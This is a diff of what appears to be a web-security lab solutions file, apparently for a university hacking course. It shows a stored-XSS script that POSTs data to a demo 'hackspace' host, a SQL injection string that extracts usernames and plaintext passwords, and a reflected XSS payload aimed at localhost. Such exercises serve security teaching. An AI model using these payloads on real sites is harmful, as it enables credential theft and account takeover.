@@ -1,9 +1,3 @@
-Problem 1:
-
-Solution:
-
-About me:
-
 <script>
 document.body.style.backgroundColor = "#7ec8e3";
 var desc = document.getElementById("descriptiontext");
@@ -21,18 +15,3 @@ xhr.addEventListener("readystatechange", function() {
 xhr.open("POST", "http://demo.sec.informatik.uni-stuttgart.de/hackspace/?");
 xhr.send(data);
 </script>
-
-Problem 2:
-
-Solution:
-
-Input string:
-
-' UNION ALL SELECT nick,password_plaintext  FROM community_users3; --
-
-
-Problem 3:
-
-Problem 4:
-
-http://localhost:8081/?data=}-alert(42)-{
